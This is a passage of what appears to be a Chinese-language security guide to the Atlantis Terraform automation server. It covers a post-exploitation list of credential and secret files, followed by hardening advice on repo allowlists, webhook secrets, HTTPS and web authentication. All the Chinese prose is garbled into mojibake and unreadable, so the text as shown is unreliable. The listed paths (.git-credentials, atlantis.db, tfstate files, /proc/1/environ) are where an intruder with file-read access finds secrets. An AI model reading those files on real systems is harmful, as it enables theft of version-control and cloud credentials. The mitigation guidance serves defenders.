- å¦‚æœæ‚¨æŒ‡å®šäº†`--repo-allowlist`ï¼Œé‚£ä¹ˆä»–ä»¬åªèƒ½ä¼ªé€ ä¸é‚£äº›å­˜å‚¨åº“ç›¸å…³çš„è¯·æ±‚ï¼Œå› æ­¤ä»–ä»¬å¯èƒ½å¯¹æ‚¨è‡ªå·±çš„å­˜å‚¨åº“è¿›è¡Œè®¡åˆ’/åº”ç”¨ã€‚
- ä¸ºé˜²æ­¢æ­¤ç±»æƒ…å†µï¼Œå…è®¸åˆ—å‡º[Bitbucketçš„IPåœ°å€](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html)ï¼ˆè¯·å‚é˜…Outbound IPv4åœ°å€ï¼‰ã€‚

## åæ¸—é€

å¦‚æœæ‚¨æˆåŠŸè®¿é—®äº†æœåŠ¡å™¨ï¼Œæˆ–è€…è‡³å°‘è·å¾—äº†LFIï¼Œæœ‰ä¸€äº›æœ‰è¶£çš„äº‹æƒ…æ‚¨åº”è¯¥å°è¯•é˜…è¯»ï¼š

- `/home/atlantis/.git-credentials` åŒ…å«VCSè®¿é—®å‡­æ®
- `/atlantis-data/atlantis.db` åŒ…å«æ›´å¤šä¿¡æ¯çš„VCSè®¿é—®å‡­æ®
- `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` TerraformçŠ¶æ€æ–‡ä»¶
- ä¾‹å¦‚ï¼š/atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
- `/proc/1/environ` ç¯å¢ƒå˜é‡
- `/proc/[2-20]/cmdline` `atlantis server`çš„Cmdè¡Œï¼ˆå¯èƒ½åŒ…å«æ•æ„Ÿæ•°æ®ï¼‰

## ç¼“è§£æªæ–½

### ä¸è¦åœ¨å…¬å…±å­˜å‚¨åº“ä¸Šä½¿ç”¨ <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

å› ä¸ºä»»ä½•äººéƒ½å¯ä»¥åœ¨å…¬å…±æ‹‰å–è¯·æ±‚ä¸Šå‘è¡¨è¯„è®ºï¼Œå³ä½¿æœ‰æ‰€æœ‰å¯ç”¨çš„å®‰å…¨ç¼“è§£æªæ–½ï¼Œä¹Ÿåœ¨æ²¡æœ‰æ­£ç¡®é…ç½®å®‰å…¨è®¾ç½®çš„æƒ…å†µä¸‹åœ¨å…¬å…±å­˜å‚¨åº“ä¸Šè¿è¡ŒAtlantisä»ç„¶å¾ˆå±é™©ã€‚

### ä¸è¦ä½¿ç”¨`--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

å¦‚æœæ‚¨åœ¨å…¬å…±å­˜å‚¨åº“ä¸Šè¿è¡Œï¼ˆä¸å»ºè®®ï¼Œè¯·å‚è§ä¸Šæ–‡ï¼‰ï¼Œåˆ™ä¸åº”è®¾ç½®`--allow-fork-prs`ï¼ˆé»˜è®¤ä¸ºfalseï¼‰ï¼Œå› ä¸ºä»»ä½•äººéƒ½å¯ä»¥ä»å…¶åˆ†æ”¯å‘æ‚¨çš„å­˜å‚¨åº“æ‰“å¼€æ‹‰å–è¯·æ±‚ã€‚

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantisè¦æ±‚æ‚¨é€šè¿‡`--repo-allowlist`æ ‡å¿—æŒ‡å®šå®ƒå°†æ¥å—Webhookçš„å­˜å‚¨åº“çš„ç™½åå•ã€‚ä¾‹å¦‚ï¼š

- ç‰¹å®šå­˜å‚¨åº“ï¼š`--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
- æ•´ä¸ªç»„ç»‡ï¼š`--repo-allowlist=github.com/runatlantis/*`
- æ‚¨GitHubä¼ä¸šå®‰è£…ä¸­çš„æ¯ä¸ªå­˜å‚¨åº“ï¼š`--repo-allowlist=github.yourcompany.com/*`
- æ‰€æœ‰å­˜å‚¨åº“ï¼š`--repo-allowlist=*`ã€‚åœ¨å—ä¿æŠ¤çš„ç½‘ç»œä¸­å¾ˆæœ‰ç”¨ï¼Œä½†å¦‚æœæ²¡æœ‰è®¾ç½®Webhookå¯†é’¥ï¼Œåˆ™å¯èƒ½å¾ˆå±é™©ã€‚

æ­¤æ ‡å¿—ç¡®ä¿æ‚¨çš„Atlantiså®‰è£…ä¸ä¼šä¸æ‚¨æ— æ³•æ§åˆ¶çš„å­˜å‚¨åº“ä¸€èµ·ä½¿ç”¨ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…`atlantis server --help`ã€‚

### ä¿æŠ¤Terraformè§„åˆ’ <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

å¦‚æœæ”»å‡»è€…æäº¤å¸¦æœ‰æ¶æ„Terraformä»£ç çš„æ‹‰å–è¯·æ±‚åœ¨æ‚¨çš„å¨èƒæ¨¡å‹ä¸­ï¼Œåˆ™å¿…é¡»æ„è¯†åˆ°`terraform apply`æ‰¹å‡†æ˜¯ä¸å¤Ÿçš„ã€‚å¯ä»¥ä½¿ç”¨[`external`æ•°æ®æº](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source)è¿è¡Œæ¶æ„ä»£ç åœ¨`terraform plan`ä¸­ï¼Œæˆ–è€…é€šè¿‡æŒ‡å®šæ¶æ„æä¾›ç¨‹åºã€‚ç„¶åï¼Œæ­¤ä»£ç å¯èƒ½çªƒå–æ‚¨çš„å‡­æ®ã€‚

ä¸ºé˜²æ­¢æ­¤æƒ…å†µï¼Œæ‚¨å¯ä»¥ï¼š

1. å°†æä¾›ç¨‹åºåµŒå…¥Atlantisé•œåƒæˆ–ä¸»æœºï¼Œå¹¶åœ¨ç”Ÿäº§ç¯å¢ƒä¸­æ‹’ç»å‡ºå£ã€‚
2. åœ¨å†…éƒ¨å®ç°æä¾›ç¨‹åºæ³¨å†Œè¡¨åè®®å¹¶æ‹’ç»å…¬å…±å‡ºå£ï¼Œè¿™æ ·æ‚¨å°±å¯ä»¥æ§åˆ¶è°å…·æœ‰å¯¹æ³¨å†Œè¡¨çš„å†™è®¿é—®æƒé™ã€‚
3. ä¿®æ”¹æ‚¨çš„[æœåŠ¡å™¨ç«¯å­˜å‚¨åº“é…ç½®](https://www.runatlantis.io/docs/server-side-repo-config.html)çš„`plan`æ­¥éª¤ï¼Œä»¥éªŒè¯æ˜¯å¦ä½¿ç”¨äº†ä¸å…è®¸çš„æä¾›ç¨‹åºæˆ–æ•°æ®æºæˆ–æ¥è‡ªä¸å…è®¸ç”¨æˆ·çš„PRã€‚åœ¨æ­¤æ—¶æ·»åŠ é¢å¤–çš„éªŒè¯ä¹Ÿæ˜¯æœ‰ç”¨çš„ï¼Œä¾‹å¦‚åœ¨å…è®¸`plan`ç»§ç»­ä¹‹å‰è¦æ±‚PRä¸Šçš„â€œç‚¹èµâ€ã€‚Conftestå¯èƒ½åœ¨è¿™é‡Œæœ‰ç”¨ã€‚

### Webhookå¯†é’¥ <a href="#webhook-secrets" id="webhook-secrets"></a>

åº”é€šè¿‡`$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`ç¯å¢ƒå˜é‡è®¾ç½®Atlantisè¿è¡Œæ—¶çš„Webhookå¯†é’¥ã€‚å³ä½¿è®¾ç½®äº†`--repo-allowlist`æ ‡å¿—ï¼Œå¦‚æœæ²¡æœ‰Webhookå¯†é’¥ï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥ä¼ªè£…æˆå…è®¸åˆ—å‡ºçš„å­˜å‚¨åº“å‘Atlantiså‘å‡ºè¯·æ±‚ã€‚Webhookå¯†é’¥ç¡®ä¿Webhookè¯·æ±‚å®é™…æ¥è‡ªæ‚¨çš„VCSæä¾›ç¨‹åºï¼ˆGitHubæˆ–GitLabï¼‰ã€‚

å¦‚æœæ‚¨ä½¿ç”¨Azure DevOpsï¼Œå¯ä»¥æ·»åŠ åŸºæœ¬ç”¨æˆ·åå’Œå¯†ç ï¼Œè€Œä¸æ˜¯Webhookå¯†é’¥ã€‚

### Azure DevOpsåŸºæœ¬èº«ä»½éªŒè¯ <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOpsæ”¯æŒåœ¨æ‰€æœ‰Webhookäº‹ä»¶ä¸­å‘é€åŸºæœ¬èº«ä»½éªŒè¯å¤´ã€‚è¿™éœ€è¦åœ¨Webhookä½ç½®ä½¿ç”¨HTTPS URLã€‚

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

å¦‚æœæ‚¨ä½¿ç”¨Webhookå¯†é’¥ï¼Œä½†æµé‡é€šè¿‡HTTPï¼Œåˆ™Webhookå¯†é’¥å¯èƒ½ä¼šè¢«çªƒå–ã€‚ä½¿ç”¨`--ssl-cert-file`å’Œ`--ssl-key-file`æ ‡å¿—å¯ç”¨SSL/HTTPSã€‚

### åœ¨Atlantis WebæœåŠ¡å™¨ä¸Šå¯ç”¨èº«ä»½éªŒè¯ <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

å¼ºçƒˆå»ºè®®åœ¨WebæœåŠ¡ä¸­å¯ç”¨èº«ä»½éªŒè¯ã€‚ä½¿ç”¨`--web-basic-auth=true`å¯ç”¨BasicAuthï¼Œå¹¶ä½¿ç”¨`--web-username=yourUsername`å’Œ`--web-password=yourPassword`æ ‡å¿—è®¾ç½®ç”¨æˆ·åå’Œå¯†ç ã€‚

æ‚¨è¿˜å¯ä»¥å°†è¿™äº›ä½œä¸ºç¯å¢ƒå˜é‡ä¼ é€’`ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` å’Œ `ATLANTIS_WEB_PASSWORD=yourPassword`ã€‚

## å‚è€ƒèµ„æ–™

- [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
- [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)
